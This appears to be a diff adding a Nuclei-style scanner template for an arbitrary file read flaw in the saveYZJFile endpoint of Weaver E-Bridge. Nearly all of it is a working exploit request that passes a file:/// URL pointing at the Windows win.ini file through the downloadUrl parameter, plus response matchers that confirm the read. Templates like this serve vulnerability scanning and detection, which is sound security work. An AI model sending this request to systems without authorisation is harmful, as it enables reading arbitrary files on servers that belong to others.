@@ -1,0 +1,37 @@
+id: Weaver-E-Bridge-downloadUrl-File-Read
+
+info:
+  name: 泛微E-Bridge接口saveYZJFile参数downloadUrl存在任意文件读取漏洞
+  author: htq
+  severity: high
+
+http:
+  - raw:
+    - |
+      @timeout 30s
+      GET /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///c://windows/win.ini&fileExt=txt HTTP/1.1
+      Host: {{Hostname}}
+      Connection: keep-alive
+      sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Microsoft Edge";v="128"
+      sec-ch-ua-mobile: ?0
+      sec-ch-ua-platform: "Windows"
+      Upgrade-Insecure-Requests: 1
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+      Sec-Fetch-Site: none
+      Sec-Fetch-Mode: navigate
+      Sec-Fetch-User: ?1
+      Sec-Fetch-Dest: document
+      Accept-Encoding: gzip, deflate, br, zstd
+      Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+
+    matchers:
+    - type: word
+      part: body
+      words:
+        - "filepath"
+        - "filesize"
+        - "updatetime"
+        - "id"
+      condition: and
+      
